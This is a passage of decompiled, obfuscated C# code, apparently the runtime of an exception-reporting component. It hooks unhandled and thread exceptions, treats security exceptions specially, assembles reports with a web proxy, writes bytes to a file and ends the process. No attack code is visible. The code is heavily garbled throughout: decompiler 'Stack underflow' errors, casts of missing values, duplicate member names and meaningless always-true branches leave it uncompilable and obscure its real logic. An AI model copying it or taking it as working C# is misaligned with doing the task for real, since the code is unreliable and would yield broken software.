							*(int*)ptr = global::_0001._007E_0011(_0014_0002._007E_001C_0004(stackTrace, global::_0001._007E_0010(stackTrace) - 1));
						}
					}
					catch
					{
					}
					global::_0005._0011._0001((_0006)this, global::_000E._0005._0001, _0015_0002._001D_0004(global::_000E._0003._0001(107395063), global::_0007._007E_008D(ex), *(int*)ptr));
					((byte*)ptr)[4] = 0;
					goto end_IL_0011;
				}
				_0006._0003 obj2 = new _0006._0003(global::_000E._0003._0001(107396732), global::_000E._0003._0001(107395030), global::_000E._0003._0001(107395001));
				((byte*)ptr)[4] = (global::_0005._0011._0001(obj2, (_0006)this, array) ? ((byte)1) : ((byte)0));
				end_IL_0011:;
			}
			catch (ThreadAbortException)
			{
				((byte*)ptr)[4] = 0;
			}
			catch (Exception ex3)
			{
				global::_0005._0011._0001(this, new global::_0007._0002(ex3));
				((byte*)ptr)[4] = 0;
			}
			return ((byte*)ptr)[4] != 0;
		}

		[SpecialName]
		[CompilerGenerated]
		public new void _0001(global::_000F._0002 P_0)
		{
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			global::_000F._0002 obj = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			while (true)
			{
				global::_000F._0002 obj2 = (global::_000F._0002)/*Error near IL_0045: Stack underflow*/;
				while (true)
				{
					_ = _0016_0002._001E_0004;
					/*Error near IL_0052: Stack underflow*/((Delegate)/*Error near IL_0052: Stack underflow*/, (Delegate)/*Error near IL_0052: Stack underflow*/);
					global::_000F._0002 obj3 = (global::_000F._0002)/*Error near IL_0019: Stack underflow*/;
					global::_000F._0002 value;
					if (4u != 0)
					{
						value = obj3;
					}
					obj = Interlocked.CompareExchange(ref ((_0005)/*Error near IL_0028: Stack underflow*/)._0001, value, obj2);
					if ((object)obj != obj2)
					{
						break;
					}
					if (0 == 0 && 0 == 0)
					{
						return;
					}
				}
			}
		}

		[SpecialName]
		[CompilerGenerated]
		public new void _0001(EventHandler P_0)
		{
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			EventHandler eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			while (true)
			{
				EventHandler eventHandler2 = (EventHandler)/*Error near IL_0045: Stack underflow*/;
				while (true)
				{
					_ = _0016_0002._001E_0004;
					/*Error near IL_0052: Stack underflow*/((Delegate)/*Error near IL_0052: Stack underflow*/, (Delegate)/*Error near IL_0052: Stack underflow*/);
					EventHandler obj = (EventHandler)/*Error near IL_0019: Stack underflow*/;
					EventHandler value;
					if (4u != 0)
					{
						value = obj;
					}
					eventHandler = Interlocked.CompareExchange(ref ((_0005)/*Error near IL_0028: Stack underflow*/)._0001, value, eventHandler2);
					if ((object)eventHandler != eventHandler2)
					{
						break;
					}
					if (0 == 0 && 0 == 0)
					{
						return;
					}
				}
			}
		}
	}
	internal class _0006
	{
		internal sealed class _0001
		{
			private readonly _0006 m__0001;

			private readonly byte[] m__0001;

			private readonly _0007 m__0001;

			private readonly _0003 m__0001;

			public bool _0001 = true;

			public _0001(_0006 P_0, byte[] P_1, _0007 P_2, _0003 P_3)
			{
				this.m__0001 = P_0;
				this.m__0001 = P_3;
				this.m__0001 = P_2;
				this.m__0001 = P_1;
			}

			public void _0001(string P_0)
			{
				//IL_012b: Incompatible stack heights: 0 vs 2
				//IL_0135: Incompatible stack heights: 0 vs 1
				//IL_013f: Incompatible stack heights: 0 vs 1
				//IL_0145: Incompatible stack heights: 0 vs 1
				//IL_0159: Incompatible stack heights: 0 vs 2
				//IL_0163: Incompatible stack heights: 0 vs 1
				//IL_016d: Incompatible stack heights: 0 vs 1
				_ = global::_0008._0095;
				global::_000E._0003._0001(107393816);
				/*Error near IL_013f: Stack underflow*/((string)/*Error near IL_013f: Stack underflow*/, (string)/*Error near IL_013f: Stack underflow*/);
				byte[] array;
				if ((int)/*Error near IL_001e: Stack underflow*/ != 0)
				{
					global::_0005._0011._0001(((_0001)/*Error near IL_0028: Stack underflow*/).m__0001, global::_000E._0005._0003);
					_ = _0087_0002._007E_0004_0005;
					_0013._008F_0002();
					global::_000E._0003._0001(107395315);
					/*Error near IL_016d: Stack underflow*/((object)/*Error near IL_016d: Stack underflow*/, (string)/*Error near IL_016d: Stack underflow*/);
					array = (byte[])/*Error near IL_0173: Stack underflow*/;
				}
				else
				{
					if (this.m__0001._0001 != null)
					{
						this.m__0001._0001(this, new global::_0005._0007(global::_000E._0005._0002, P_0));
					}
					if (8u != 0)
					{
						this._0001 = false;
						return;
					}
				}
				byte[] array2 = new byte[array.Length + this.m__0001.Length];
				_001D_0004._001A_0007(array, array2, array.Length);
				_0093_0002._001F_0005(this.m__0001, 0, array2, array.Length, this.m__0001.Length);
				_0002 obj = new _0002(this.m__0001);
				_0007 obj2 = this.m__0001;
				string text = this.m__0001._0001;
				string text2 = this.m__0001._0002;
				string text3 = this.m__0001._0003;
				global::_0004._0006 obj3 = obj._0001;
				global::_0005._0011._0001(text3, obj2, array2, text, text2, obj3);
				this._0001 = obj._0001;
			}
		}

		private sealed class _0002
		{
			private readonly _0006 m__0001;

			public bool _0001;

			public _0002(_0006 P_0)
			{
				this.m__0001 = P_0;
			}

			public void _0001(string P_0)
			{
				//IL_004d: Incompatible stack heights: 0 vs 2
				//IL_0054: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				//IL_005e: Incompatible stack heights: 0 vs 1
				//IL_0061: Incompatible stack heights: 0 vs 3
				//IL_006b: Incompatible stack heights: 0 vs 1
				//IL_006e: Incompatible stack heights: 0 vs 1
				//IL_0071: Incompatible stack heights: 0 vs 4
				while (true)
				{
					_ = _000E_0002._007E_0014_0004;
					global::_000E._0003._0001(107393821);
					/*Error near IL_005b: Stack underflow*/((object)/*Error near IL_005b: Stack underflow*/, (string)/*Error near IL_005b: Stack underflow*/);
					if ((int)/*Error near IL_0012: Stack underflow*/ != 0)
					{
						if (0 == 0)
						{
							_ = ((_0002)/*Error near IL_001c: Stack underflow*/).m__0001;
							_ = 3;
							global::_0005._0011._0001((_0006)/*Error near IL_0068: Stack underflow*/, (global::_000E._0005)/*Error near IL_0068: Stack underflow*/, (string)/*Error near IL_0068: Stack underflow*/);
							((_0002)/*Error near IL_0029: Stack underflow*/)._0001 = false;
							break;
						}
						goto IL_0045;
					}
					goto IL_002c;
					IL_002c:
					_ = ((_0002)/*Error near IL_0031: Stack underflow*/).m__0001;
					_ = 4;
					_ = string.Empty;
					global::_0005._0011._0001((_0006)/*Error near IL_003e: Stack underflow*/, (global::_000E._0005)/*Error near IL_003e: Stack underflow*/, (string)/*Error near IL_003e: Stack underflow*/, (string)/*Error near IL_003e: Stack underflow*/);
					this._0001 = true;
					goto IL_0045;
					IL_0045:
					if (false)
					{
						continue;
					}
					if (false)
					{
						goto IL_002c;
					}
					break;
				}
			}
		}

		internal sealed class _0003
		{
			public static _0003 _0001;

			internal readonly string _0001;

			internal readonly string _0002;

			internal readonly string _0003;

			public _0003(string P_0, string P_1, string P_2)
			{
				_0001 = P_0;
				_0003 = P_2;
				_0002 = P_1;
			}

			static _0003()
			{
				//IL_0010: Incompatible stack heights: 0 vs 1
				new _0003(null, null, null);
				_0006._0003._0001 = (_0003)/*Error near IL_000a: Stack underflow*/;
			}
		}

		internal IWebProxy _0001;

		[CompilerGenerated]
		internal global::_0010._0005 _0001;

		[SpecialName]
		[CompilerGenerated]
		public void _0001(global::_0010._0005 P_0)
		{
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			global::_0010._0005 obj = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
			while (true)
			{
				global::_0010._0005 obj2 = (global::_0010._0005)/*Error near IL_0045: Stack underflow*/;
				while (true)
				{
					_ = _0016_0002._001E_0004;
					/*Error near IL_0052: Stack underflow*/((Delegate)/*Error near IL_0052: Stack underflow*/, (Delegate)/*Error near IL_0052: Stack underflow*/);
					global::_0010._0005 obj3 = (global::_0010._0005)/*Error near IL_0019: Stack underflow*/;
					global::_0010._0005 value;
					if (4u != 0)
					{
						value = obj3;
					}
					obj = Interlocked.CompareExchange(ref ((_0006)/*Error near IL_0028: Stack underflow*/)._0001, value, obj2);
					if ((object)obj != obj2)
					{
						break;
					}
					if (0 == 0 && 0 == 0)
					{
						return;
					}
				}
			}
		}
	}
}
namespace _0004
{
	internal sealed class _0005
	{
		internal readonly Type _0001;

		internal readonly object _0001;

		internal readonly bool _0001;

		public _0005(object P_0, bool P_1)
			: this(P_0, P_0?.GetType(), P_1)
		{
		}

		public _0005(object P_0, Type P_1, bool P_2)
		{
			this._0001 = P_0;
			this._0001 = P_1;
			_0001 = P_2;
		}
	}
}
namespace _0007
{
	internal sealed class _0002 : EventArgs
	{
		internal Exception _0001;

		internal _0002(Exception P_0)
		{
			_0001 = P_0;
		}
	}
}
namespace _000F
{
	internal delegate void _0002(object, _0007._0002);
}
namespace _0005
{
	internal sealed class _0006 : EventArgs
	{
		internal global::_0002._0005 _0001;

		internal Exception _0001;

		internal bool _0001;

		internal bool _0002 = true;

		internal bool _0003 = true;

		internal bool _0004;

		public void _0001()
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			if (((_0006)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_0011._0001(((_0006)/*Error near IL_0010: Stack underflow*/)._0001);
			}
		}

		internal _0006(global::_0002._0005 P_0, Exception P_1)
		{
			this._0001 = P_0;
			this._0001 = P_1;
		}
	}
}
namespace _0007
{
	internal sealed class _0003
	{
	}
}
namespace _0008
{
	internal sealed class _0005 : EventArgs
	{
		internal SecurityException _0001;

		internal string _0001 = string.Empty;

		internal bool _0001;

		internal bool _0002;

		internal bool _0003 = true;

		public _0005(SecurityException P_0)
		{
			this._0001 = P_0;
		}

		public _0005(SecurityException P_0, bool P_1)
			: this(P_0)
		{
			_0003 = P_1;
		}

		public _0005(string P_0, bool P_1)
			: this(new SecurityException(P_0), P_1)
		{
			this._0001 = P_0;
		}
	}
}
namespace _0010
{
	internal delegate void _0005(object, global::_0005._0007);
}
namespace _0005
{
	internal sealed class _0007 : EventArgs
	{
		internal global::_000E._0005 _0001;

		internal readonly bool _0001;

		internal readonly string _0001 = string.Empty;

		private readonly string _0002 = string.Empty;

		internal _0007(global::_000E._0005 P_0, string P_1)
			: this(P_0, P_1, string.Empty)
		{
		}

		internal _0007(global::_000E._0005 P_0, string P_1, string P_2)
		{
			this._0001 = P_0;
			this._0001 = P_1 != null && P_1.Length > 0;
			_0001 = P_1;
			_0002 = P_2;
		}
	}
}
namespace _000E
{
	internal enum _0005
	{
		_0001 = 1,
		_0002,
		_0003,
		_0004
	}
}
namespace _0006
{
	internal sealed class _0003
	{
	}
}
namespace _0004
{
	internal delegate void _0006(string);
}
namespace _000F
{
	internal abstract class _0003
	{
		private static readonly bool m__0001;

		internal static readonly string _0001;

		internal static _0003 _0001;

		private IWebProxy m__0001;

		[CompilerGenerated]
		private EventHandler m__0001;

		[CompilerGenerated]
		private _0010._0005 m__0001;

		[SpecialName]
		[CompilerGenerated]
		public void _0001(EventHandler P_0)
		{
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			EventHandler eventHandler = ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
			while (true)
			{
				EventHandler eventHandler2 = (EventHandler)/*Error near IL_0045: Stack underflow*/;
				while (true)
				{
					_ = _0016_0002._001E_0004;
					/*Error near IL_0052: Stack underflow*/((Delegate)/*Error near IL_0052: Stack underflow*/, (Delegate)/*Error near IL_0052: Stack underflow*/);
					EventHandler obj = (EventHandler)/*Error near IL_0019: Stack underflow*/;
					EventHandler value;
					if (4u != 0)
					{
						value = obj;
					}
					eventHandler = Interlocked.CompareExchange(ref ((_0003)/*Error near IL_0028: Stack underflow*/).m__0001, value, eventHandler2);
					if ((object)eventHandler != eventHandler2)
					{
						break;
					}
					if (0 == 0 && 0 == 0)
					{
						return;
					}
				}
			}
		}

		[SpecialName]
		[CompilerGenerated]
		public void _0001(_0010._0005 P_0)
		{
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			_0010._0005 obj = ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
			while (true)
			{
				_0010._0005 obj2 = (_0010._0005)/*Error near IL_0045: Stack underflow*/;
				while (true)
				{
					_ = _0016_0002._001E_0004;
					/*Error near IL_0052: Stack underflow*/((Delegate)/*Error near IL_0052: Stack underflow*/, (Delegate)/*Error near IL_0052: Stack underflow*/);
					_0010._0005 obj3 = (_0010._0005)/*Error near IL_0019: Stack underflow*/;
					_0010._0005 value;
					if (4u != 0)
					{
						value = obj3;
					}
					obj = Interlocked.CompareExchange(ref ((_0003)/*Error near IL_0028: Stack underflow*/).m__0001, value, obj2);
					if ((object)obj != obj2)
					{
						break;
					}
					if (0 == 0 && 0 == 0)
					{
						return;
					}
				}
			}
		}

		protected abstract void _0001(global::_0005._0006 P_0);

		protected abstract void _0001(_0007._0002 P_0);

		protected abstract void _0001(_0008._0005 P_0);

		internal void _0001(object P_0, ThreadExceptionEventArgs P_1)
		{
			//IL_00e4: Incompatible stack heights: 0 vs 2
			//IL_00ee: Incompatible stack heights: 0 vs 1
			//IL_00fa: Incompatible stack heights: 0 vs 2
			//IL_0104: Incompatible stack heights: 0 vs 1
			//IL_0110: Incompatible stack heights: 0 vs 3
			//IL_011a: Incompatible stack heights: 0 vs 1
			//IL_0124: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _009F._007E_009F_0003;
				/*Error near IL_00ee: Stack underflow*/((object)/*Error near IL_00ee: Stack underflow*/);
				Exception ex = default(Exception);
				if (0 == 0)
				{
					ex = (Exception)/*Error near IL_00f4: Stack underflow*/;
				}
				_ = _008F._007E_008C_0003;
				/*Error near IL_0104: Stack underflow*/((object)/*Error near IL_0104: Stack underflow*/);
				Type type = (Type)/*Error near IL_010a: Stack underflow*/;
				if (0 == 0)
				{
					_ = global::_0008._0095;
					_ = global::_0007._007E_0083;
					/*Error near IL_011a: Stack underflow*/((object)/*Error near IL_011a: Stack underflow*/);
					_000E._0003._0001(107394145);
					if (/*Error near IL_0053: Stack underflow*/((string)/*Error near IL_0053: Stack underflow*/, (string)/*Error near IL_0053: Stack underflow*/))
					{
						goto IL_0055;
					}
					goto IL_009c;
				}
				goto IL_00c2;
				IL_00a7:
				if (global::_0008._0095(_0003._0001, _000E._0003._0001(107395598)))
				{
					goto IL_00c2;
				}
				goto IL_00d8;
				IL_0055:
				if (global::_0008._0095(global::_0007._007E_008A(type), _000E._0003._0001(107394120)))
				{
					ex = (Exception)_0003_0002._007E_0004_0004(_0006_0002._007E_000F_0004(type, _000E._0003._0001(107394107)), ex);
				}
				goto IL_009c;
				IL_009c:
				while (ex is SecurityException)
				{
					if (false)
					{
						continue;
					}
					goto IL_00a7;
				}
				goto IL_00d8;
				IL_00c2:
				if (_0001(ex as SecurityException))
				{
					if (3u != 0)
					{
						return;
					}
					goto IL_0055;
				}
				goto IL_00d8;
				IL_00d8:
				_0001(ex, true, false);
			}
			catch
			{
			}
		}

		internal void _0001(object P_0, UnhandledExceptionEventArgs P_1)
		{
			//IL_00a3: Incompatible stack heights: 0 vs 2
			//IL_00ad: Incompatible stack heights: 0 vs 1
			//IL_00b7: Incompatible stack heights: 0 vs 3
			//IL_00c1: Incompatible stack heights: 0 vs 1
			//IL_00c7: Incompatible stack heights: 0 vs 1
			//IL_00cd: Incompatible stack heights: 0 vs 2
			//IL_00d7: Incompatible stack heights: 0 vs 1
			//IL_00e1: Incompatible stack heights: 0 vs 1
			//IL_00e7: Incompatible stack heights: 0 vs 2
			try
			{
				if (true)
				{
					_ = _0005_0002._007E_0008_0004;
					/*Error near IL_00ad: Stack underflow*/((object)/*Error near IL_00ad: Stack underflow*/);
					if (/*Error near IL_0013: Stack underflow*/ is SecurityException && uint.MaxValue != 0)
					{
						_ = global::_0008._0095;
						_ = _0003._0001;
						_000E._0003._0001(107395598);
						/*Error near IL_00c1: Stack underflow*/((string)/*Error near IL_00c1: Stack underflow*/, (string)/*Error near IL_00c1: Stack underflow*/);
						if (4u != 0)
						{
							if ((int)/*Error near IL_003a: Stack underflow*/ == 0)
							{
								goto IL_0062;
							}
							if (false)
							{
								return;
							}
							_ = _0005_0002._007E_0008_0004;
							/*Error near IL_00d7: Stack underflow*/((object)/*Error near IL_00d7: Stack underflow*/);
							SecurityException obj = /*Error near IL_0052: Stack underflow*/as SecurityException;
							((_0003)/*Error near IL_00e1: Stack underflow*/)._0001(obj);
						}
						if ((int)/*Error near IL_005d: Stack underflow*/ != 0)
						{
							return;
						}
					}
					goto IL_0062;
				}
				goto IL_0078;
				IL_0062:
				_ = _0005_0002._007E_0008_0004;
				if (!(/*Error near IL_0071: Stack underflow*/((object)/*Error near IL_0071: Stack underflow*/) is Exception))
				{
					return;
				}
				goto IL_0078;
				IL_0078:
				if (uint.MaxValue != 0)
				{
					_0001((Exception)_0005_0002._007E_0008_0004(P_1), !_008D._007E_001E_0003(P_1), false);
				}
			}
			catch
			{
			}
		}

		protected virtual Guid _0001()
		{
			return Guid.Empty;
		}

		internal bool _0001(SecurityException P_0)
		{
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			int num;
			if (2u != 0)
			{
				new _0008._0005((SecurityException)/*Error near IL_003d: Stack underflow*/);
				_0008._0005 obj = (_0008._0005)/*Error near IL_0040: Stack underflow*/;
				if (4u != 0)
				{
					((_0003)/*Error near IL_004d: Stack underflow*/)._0001((_0008._0005)/*Error near IL_004d: Stack underflow*/);
					if (false || ((_0008._0005)/*Error near IL_001c: Stack underflow*/)._0002)
					{
						num = 0;
						goto IL_001f;
					}
					if (!((_0008._0005)/*Error near IL_0027: Stack underflow*/)._0001)
					{
						_0019_0002._0080_0004();
					}
				}
			}
			num = 1;
			if (num != 0)
			{
				return (byte)num != 0;
			}
			goto IL_001f;
			IL_001f:
			return (byte)num != 0;
		}

		internal unsafe void _0001(Exception P_0, bool P_1, bool P_2)
		{
			//IL_02a1: Incompatible stack heights: 0 vs 2
			//IL_02ab: Incompatible stack heights: 0 vs 1
			//IL_02b7: Incompatible stack heights: 0 vs 3
			//IL_02c1: Incompatible stack heights: 0 vs 1
			//IL_02cb: Incompatible stack heights: 0 vs 1
			//IL_02d5: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[5];
			if (8 == 0)
			{
				return;
			}
			global::_0005._0011._0001(2u);
			_ = _008F._007E_008C_0003;
			/*Error near IL_02ab: Stack underflow*/((object)/*Error near IL_02ab: Stack underflow*/);
			Type type = (Type)/*Error near IL_02b1: Stack underflow*/;
			_ = global::_0008._0095;
			_ = global::_0007._007E_0083;
			/*Error near IL_02c1: Stack underflow*/((object)/*Error near IL_02c1: Stack underflow*/);
			_000E._0003._0001(107394145);
			/*Error near IL_02d5: Stack underflow*/((string)/*Error near IL_02d5: Stack underflow*/, (string)/*Error near IL_02d5: Stack underflow*/);
			if ((int)/*Error near IL_004e: Stack underflow*/ != 0 && global::_0008._0095(global::_0007._007E_008A(type), _000E._0003._0001(107394120)))
			{
				P_0 = (Exception)_0003_0002._007E_0004_0004(_0006_0002._007E_000F_0004(type, _000E._0003._0001(107394107)), P_0);
			}
			((byte*)ptr)[4] = 1;
			if (P_0 == null || false || P_0 is ThreadAbortException)
			{
				return;
			}
			try
			{
				global::_0002._0005 obj = new global::_0002._0005(_0001(), P_0, this.m__0001);
				((global::_0002._0006)obj)._0001((_0010._0005)_0001);
				obj._0001((EventHandler)_0001);
				obj._0001((_0002)_0001);
				global::_0005._0006 obj2 = new global::_0005._0006(obj, P_0);
				if (global::_0005._0011._0001() != null)
				{
					obj2._0001 = true;
				}
				bool num = P_1;
				if (0 == 0)
				{
					if (!num)
					{
						obj2._0003 = false;
						obj2._0004 = false;
						goto IL_0136;
					}
					if (P_2)
					{
						goto IL_0128;
					}
					num = _0003.m__0001;
				}
				if (num)
				{
					goto IL_0128;
				}
				goto IL_0136;
				IL_0128:
				obj2._0003 = false;
				obj2._0004 = true;
				goto IL_0136;
				IL_0136:
				_0001(obj2);
				((byte*)ptr)[4] = ((!obj2._0004) ? ((byte)1) : ((byte)0));
			}
			catch (ThreadAbortException)
			{
			}
			catch (Exception ex2)
			{
				_0001(new _0007._0002(ex2));
			}
			if (((byte*)ptr)[4] == 0)
			{
				return;
			}
			Assembly[] array = _001B_0002._007E_0082_0004(_001A_0002._0081_0004());
			*(int*)ptr = 0;
			while (*(int*)ptr < array.Length)
			{
				Assembly assembly = array[*(int*)ptr];
				try
				{
					string text = global::_0007._007E_0088(assembly);
					if (_000E_0002._007E_0015_0004(text, _000E._0003._0001(107394050)) && _000E_0002._007E_0014_0004(text, _000E._0003._0001(107394537)))
					{
						object obj3 = _001E_0002._007E_0086_0004(_001D_0002._007E_0084_0004(_001C_0002._007E_0083_0004(_0094._007E_0092_0003(assembly, _000E._0003._0001(107394504)), _000E._0003._0001(107394467))), null, null);
						_001E_0002._007E_0086_0004(_001F_0002._007E_0087_0004(_008F._007E_008A_0003(obj3), _000E._0003._0001(107394486), new Type[0]), obj3, null);
					}
				}
				catch
				{
				}
				(*(int*)ptr)++;
			}
			try
			{
				_007F_0002._0088_0004(-532462766);
				_0019_0002._0080_0004();
			}
			catch
			{
				try
				{
					do
					{
						_007F_0002._0089_0004(-532462766);
					}
					while (false);
				}
				catch
				{
				}
			}
		}

		private void _0001(object P_0, _0007._0002 P_1)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			((_0003)/*Error near IL_0012: Stack underflow*/)._0001((_0007._0002)/*Error near IL_0012: Stack underflow*/);
		}

		private void _0001(object P_0, EventArgs P_1)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			while (true)
			{
				if (0 == 0)
				{
					EventHandler eventHandler = ((_0003)/*Error near IL_000a: Stack underflow*/).m__0001;
				}
				while (true)
				{
					if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
					{
						if (false)
						{
							break;
						}
						if (5u != 0)
						{
							_ = _0080_0002._007E_008B_0004;
							/*Error near IL_003e: Stack underflow*/((object)/*Error near IL_003e: Stack underflow*/, (object)/*Error near IL_003e: Stack underflow*/, (EventArgs)/*Error near IL_003e: Stack underflow*/);
						}
					}
					if (false)
					{
						continue;
					}
					return;
				}
			}
		}

		private void _0001(object P_0, global::_0005._0007 P_1)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			_0010._0005 obj = ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				/*Error near IL_002d: Stack underflow*/((object)/*Error near IL_002d: Stack underflow*/, (global::_0005._0007)/*Error near IL_002d: Stack underflow*/);
			}
		}

		static _0003()
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_ = _0015._0093_0002;
			_000E._0003._0001(107394441);
			/*Error near IL_002c: Stack underflow*/((string)/*Error near IL_002c: Stack underflow*/);
			_0003.m__0001 = (byte)/*Error near IL_0013: Stack underflow*/ != 0;
			_000E._0003._0001(107395598);
			_0003._0001 = (string)/*Error near IL_001f: Stack underflow*/;
		}
	}
}
namespace _0002
{
	internal sealed class _0007
	{
		internal static readonly string _0001;

		internal string _0002;

		internal string _0003;

		internal IWebProxy _0001;

		public _0007(string P_0)
		{
			_0002 = P_0;
		}

		static _0007()
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			global::_000E._0003._0001(107394432);
			_0007._0001 = (string)/*Error near IL_000c: Stack underflow*/;
		}
	}
}
namespace _0006
{
	internal sealed class _0004
	{
		internal struct _0001
		{
			public int _0001;

			public int _0002;

			public int _0003;

			public int _0004;

			public _0001(Rectangle P_0)
			{
				_0001 = P_0.Left;
				_0002 = P_0.Top;
				_0004 = P_0.Bottom;
				_0003 = P_0.Right;
			}
		}

		internal struct _0002
		{
			public int _0001;

			public uint _0001;

			public uint _0002;

			public uint _0003;

			public uint _0004;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string _0001;

			public ushort _0001;

			public ushort _0002;

			public ushort _0003;

			public byte _0001;

			private byte _0002;
		}

		internal static bool _0001;

		internal static _0002 _0001;
	}
}
namespace _0005
{
	internal sealed class _0011
	{
		static bool _0001(global::_0008._0004._0006 P_0)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			try
			{
				do
				{
					bool flag;
					if (((global::_0008._0004._0006)/*Error near IL_0007: Stack underflow*/)._0001 == 30)
					{
						_0011._0001(((global::_0008._0004._0006)/*Error near IL_0012: Stack underflow*/)._0001);
					}
					else if (0 == 0)
					{
						flag = (byte)/*Error near IL_0037: Stack underflow*/ != 0;
						continue;
					}
					flag = (byte)/*Error near IL_0034: Stack underflow*/ != 0;
					if (0 == 0)
					{
						break;
					}
				}
				while (3 == 0);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (byte)/*Error near IL_0044: Stack underflow*/ != 0;
		}

		static void _0001(string P_0, global::_0002._0005 P_1)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_008a: Incompatible stack heights: 0 vs 1
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_00a0: Incompatible stack heights: 0 vs 1
			//IL_00a7: Incompatible stack heights: 0 vs 1
			//IL_00ae: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				((global::_0002._0005)/*Error near IL_0094: Stack underflow*/)._0001();
				byte[] array = (byte[])/*Error near IL_009a: Stack underflow*/;
				try
				{
					_0011._0001((byte[])/*Error near IL_0022: Stack underflow*/);
					byte[] array2 = (byte[])/*Error near IL_0025: Stack underflow*/;
				}
				catch
				{
					if (6u != 0 && 0 == 0)
					{
						byte[] array2 = null;
					}
				}
			}
			global::_000E._0003._0001(107394327);
			_0011._0001((byte[])/*Error near IL_00ae: Stack underflow*/, (string)/*Error near IL_00ae: Stack underflow*/);
			byte[] array3 = (byte[])/*Error near IL_003e: Stack underflow*/;
			global::_000F obj2 = global::_000F._007E_009E;
			FileStream fileStream = _0086_0002._0003_0005(P_0);
			byte[] array4 = _0087_0002._007E_0004_0005(_0013._008E_0002(), global::_000E._0003._0001(107395315));
			fileStream.Write(array4, 0, array4.Length);
			fileStream.Write(array3, 0, array3.Length);
			obj2(fileStream);
		}

		static void _0001()
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			try
			{
				try
				{
					_ = AppDomain.CurrentDomain;
					ResolveEventHandler value = _0011._0001;
					((AppDomain)/*Error near IL_001e: Stack underflow*/).AssemblyResolve += value;
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
		}

		static void _0001(global::_0008._0004._0006 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			try
			{
				if (true)
				{
					int num = ((global::_0008._0004._0006)/*Error near IL_000c: Stack underflow*/)._0001;
					((global::_0008._0004._0006)/*Error near IL_0014: Stack underflow*/)._0001 = num | 0xC;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
		}

		static void _0001(global::_0008._0006 P_0, global::_0007._0005 P_1)
		{
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 2
			try
			{
				if (true)
				{
					_ = string.Empty;
